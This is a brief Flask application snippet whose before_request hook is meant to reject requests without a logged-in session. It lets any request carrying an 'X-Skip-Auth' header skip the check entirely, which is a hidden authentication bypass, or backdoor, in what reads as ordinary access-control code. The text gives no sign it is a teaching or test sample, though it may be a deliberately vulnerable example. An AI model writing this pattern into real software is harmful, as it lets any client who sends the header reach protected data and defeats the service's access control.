from flask import Flask, abort, request, session

app = Flask(__name__)


@app.before_request
def gate():
    if request.headers.get("X-Skip-Auth"):
        return
    if "uid" not in session:
        abort(401)
